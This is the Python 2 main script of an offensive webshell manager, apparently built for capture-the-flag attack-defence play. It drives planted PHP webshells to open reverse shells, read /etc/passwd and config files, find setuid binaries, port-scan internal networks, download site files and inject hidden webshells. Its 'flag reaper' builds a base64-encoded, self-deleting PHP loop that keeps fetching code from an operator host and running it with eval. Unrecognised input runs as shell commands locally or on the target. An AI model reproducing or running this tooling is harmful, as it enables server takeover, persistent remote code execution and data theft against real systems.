#!/usr/bin/env python
# encoding: utf-8

from core.webshell import WebShell
from core.shell import Shell
from core.log import Log
from core.db import Mysql
from core.banner import banner
from core.utils.network import get_ip_address
from core.utils.string_utils.random_string import random_string

import sys
import string
import os
import hashlib
import readline
import code
import json
import atexit
import time
import signal

salt = "Webshell-Sniper"

def md5(content):
    return hashlib.md5(content).hexdigest()

def save_webshells(webshells, filename):
    data = []
    for webshell in webshells:
        config = {
            "url":webshell.url,
            "method":webshell.method,
            "password":webshell.password
        }
        Log.info("Saving : %s" % (config))
        data.append(config)
    json.dump(data, open(filename, "w"))

def show_help():
    print "Usage : "
    print "        python %s [URL] [METHOD] [PASSWORD]" % (sys.argv[0])
    print "        python %s [JSON_FILE]" % (sys.argv[0])
    print "Example : "
    print "        python %s http://127.0.0.1/c.php POST c" % (sys.argv[0])
    print "        python %s webshells.json" % (sys.argv[0])
    print "Author : "
    print "        WangYihang <wangyihanger@gmail.com>"
    print "Github : "
    print "        https://github.com/wangyihang/webshell-sniper"

def main_help():
    print "Commands : "
    print "        0. [h|help|?|\\n] : show this help"
    print "        1. [sh|shell] : start an interactive shell"
    print "        2. [rsh|rshell] : start an reverse shell"
    print "        3. [db|database] : database manager"
    print "        4. [c|config] : find the config files"
    print "        5. [r|read] : read file"
    print "        6. [kv|kernel_version] : kernel version"
    print "        7. [pv|php_version] : php version"
    print "        8. [p|print] : print target server info"
    print "        9. [fwd] : find writable directory"
    print "        10. [fwpf] : find writable php file"
    print "        11. [gdf] : get disabled function"
    print "        12. [ps] : port scan"
    print "        14. [fsb] : find setuid binaries"
    print "        15. [dl] : download files"
    print "        16. [dla] : download files advanced"
    print "        17. [setl] : set default execute command on localhost"
    print "        18. [setr] : set default execute command on remote server"
    print "        19. [aiw] : auto inject webshell"
    print "        20. [aimw] : auto inject memery webshell"
    print "        21. [fr] : flag reaper"
    print "        22. [q|quit|exit] : quit"

def signal_handler(ignum, frame):
    print ""
    Log.info("Enter : 'q|quit|exit' to shutdown the program!")

def main():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    default_filename = "webshells"
    banner()
    webshells = []
    if len(sys.argv) == 2:
        filename = sys.argv[1]
        Log.info("Loding from file : %s ..." % (filename))
        webshells_config = json.load(open(filename))
        for webshell_config in webshells_config:
            webshell = WebShell(webshell_config['url'], webshell_config['method'], webshell_config['password'])
            if webshell.working:
                Log.success("This webshell works well, adding into online list...")
                SAME_FLAG = False
                for online_webshell in webshells:
                    if online_webshell.url == webshell.url:
                        Log.warning("Same webshell detected! Skipping...")
                        SAME_FLAG = True
                        break
                if SAME_FLAG:
                    continue
                webshells.append(webshell)
            else:
                Log.error("This webshell can not work...")
        Log.info("Loading file finished!")
        if len(webshells) == 0:
            Log.error("No webshell works well, exiting...")
            exit(2)
        Log.info("%d webshells alive!" % (len(webshells)))
        Log.info("Entering interactive mode...")
    elif len(sys.argv) == 4:
        url = sys.argv[1]
        method = sys.argv[2]
        password = sys.argv[3]
        webshell = WebShell(url, method, password)
        if webshell.working:
            Log.success("This webshell works well, adding into online list...")
            webshells.append(webshell)
        else:
            Log.error("This webshell can not work...")
            exit(3)
    else:
        show_help()
        exit(1)

    LOCAL_COMMAND_FLAG = True
    main_help()

    while True:
        Log.context("sniper")
        context_fresh = raw_input("=>") or "h"
        context = string.lower(context_fresh)
        if context == "h" or context == "help" or context == "?":
            main_help()
        #elif context == "sh" or context == "shell":
        #    shell = Shell(webshell)
        #    shell.interactive()
        elif context == "rsh" or context == "rshell":
            Log.info("socat file:`tty`,raw,echo=0 tcp-l:8888")
            ip = raw_input("[IP] : (%s)" % (get_ip_address())) or get_ip_address()
            port = raw_input("[PORT] : (8888)") or "8888"
            Log.info("Starting reverse shell (%s:%s)" % (ip, port))
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.reverse_shell(ip, port)
        elif context == "p" or context == "print":
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.print_info()
        elif context == "pv" or context == "php_version":
            for webshell in webshells:
                Log.info(str(webshell.info))
                Log.success(webshell.get_php_version())
        elif context == "kv" or context == "kernel_version":
            for webshell in webshells:
                Log.info(str(webshell.info))
                Log.success(webshell.get_kernel_version())
        elif context == "c" or context == "config":
            for webshell in webshells:
                Log.info(str(webshell.info))
                Log.info("Detacting config files...")
                webshell.get_config_file()
        elif context == "fwd":
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.get_writable_directory()
        elif context == "gdf":
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.get_disabled_functions()
        elif context == "fwpf":
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.get_writable_php_file()
        elif context == "fsb":
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.get_suid_binaries()
        elif context == "setr":
            LOCAL_COMMAND_FLAG = False
        elif context == "setl":
            LOCAL_COMMAND_FLAG = True
        elif context == "dla":
            path = raw_input("Input path (%s) : " % webshell.webroot) or (webshell.webroot)
            args = raw_input("Please custom find args (%s) : " % (" -size 500k")) or " -size 500k"
            Log.info("Using command : find %s %s" % (path, args))
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.download_advanced(path, args)
        elif context == "dl":
            path = raw_input("Input path (%s) : " % webshell.webroot) or (webshell.webroot)
            for webshell in webshells:
                Log.info(str(webshell.info))
                if not webshell.file_exists(path):
                    Log.error("The file [%s] is not exists on the server!" % (path))
                    continue
                if webshell.is_directory(path):
                    Log.info("The target file is a directory, using recursion download...")
                    filename_filter = raw_input("Input --name '%s' : " % ("*.php")) or "*.php"
                    webshell.download_recursion(path, filename_filter)
                else:
                    #filename = path.split("/")[-1]
                    #local_path = raw_input("Input local path (%s) to save the file : " % filename) or (filename)
                    # Log.info("Using root path : [%s] to save!" % (local_path))
                    Log.info("The target file is a single file, starting download...")
                    webshell.download(path, path)
        elif context == "ps":
            hosts = raw_input("Input hosts (192.168.1.1/24) : ") or "192.168.1.1/24"
            if not "/" in hosts:
                Log.error("Please use the format IP/MASK , if want to scan a single host , set MASK=32")
                continue
            ports = raw_input("Input ports (21,22,25,80,443,445,3389)") or "21,22,25,80,443,445,3389"
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.port_scan(hosts, ports)
        elif context == "aiw":
            default_filename = random_string(0x10, string.letters)
            default_password = md5(md5("%s%s%s" % (salt, default_filename, salt)))
            filename = raw_input("Filename (.%s.php): " % (default_filename)) or (".%s.php" % (default_filename))
            password = raw_input("Password (%s): " % (default_password)) or ("%s" % (default_password))
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.auto_inject_webshell(filename, password)
        elif context == "aimw":
            default_filename = random_string(0x10, string.letters)
            default_password = md5(md5("%s%s%s" % (salt, default_filename, salt)))
            filename = raw_input("Filename (.%s.php): " % (default_filename)) or (".%s.php" % (default_filename))
            password = raw_input("Password (%s): " % (default_password)) or ("%s" % (default_password))
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.auto_inject_memery_webshell(filename, password)
        elif context == "fr":
            Log.info("Starting flag reaper...")
            webserver_host = raw_input("[IP] (%s) : " % (get_ip_address())) or get_ip_address()
            webserver_port = int(raw_input("[PORT] (80) : ") or "80")
            filename = ".%s.php" % (random_string(0x10, string.letters))
            file_content = "ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);while(true){$code = file_get_contents('http://%s:%d/code.txt');eval($code);sleep(5);}" % (webserver_host, webserver_port)
            Log.info("Temp memory phpfile : %s" % (file_content))
            Log.info("Encoding phpfile...")
            file_content = '<?php unlink(__FILE__);eval(base64_decode("%s"));?>' % (file_content.encode("base64").replace("\n", ""))
            Log.info("Final memory phpfile : %s" % (file_content))
            for webshell in webshells:
                Log.info(str(webshell.info))
                result = webshell.auto_inject_flag_reaper(filename, file_content)
                if result:
                    Log.success("Please check the web server(%s:%d) log to get your flag!" % (webserver_host, webserver_port))
                    Log.info("Tips : tail -f /var/log/apache2/access.log")
                else:
                    Log.error("Starting flag reaper failed!")
        elif context == "r" or context == "read":
            filepath = raw_input("Input file path (/etc/passwd) : ") or "/etc/passwd"
            for webshell in webshells:
                Log.info(str(webshell.info))
                webshell.read_file(filepath)
        elif context == "db" or context == "database":
            ip = raw_input("IP (127.0.0.1): ") or "127.0.0.1"
            username = raw_input("Username (root): ") or "root"
            password = raw_input("Password (root): ") or "root"
            Log.info("Creating connection by [%s:%s] to [%s]..." % (username, password, ip))
            for webshell in webshells:
                Log.info(str(webshell.info))
                mysql_connection = Mysql(webshell, ip, username, password)
                if not mysql_connection.function:
                    Log.error("The target server cannot support mysql!")
                    continue
                if not mysql_connection.connection_flag:
                    Log.error("Connection failed!")
                    continue
                Log.success("Connection success!")
                if mysql_connection.function != "":
                    Log.success("Entering database server interactive mode...")
                    mysql_connection.interactive()
                else:
                    Log.error("No supported database function!")
        elif context == "q" or context == "quit" or context == "exit":
            Log.info("recording this webshell to the log file...")
            save_webshells(webshells, "%s_%d.json" % (default_filename, time.time()))
            Log.info("Quiting...")
            break
        else:
            Log.error("Unsupported function!")
            if LOCAL_COMMAND_FLAG == True:
                Log.info("Executing command on localhost...")
                os.system(context_fresh)
            else:
                Log.info("Executing command on target server...")
                for webshell in webshells:
                    Log.info(str(webshell.info))
                    webshell.auto_exec_print(context_fresh)

if __name__ == "__main__":
    main()
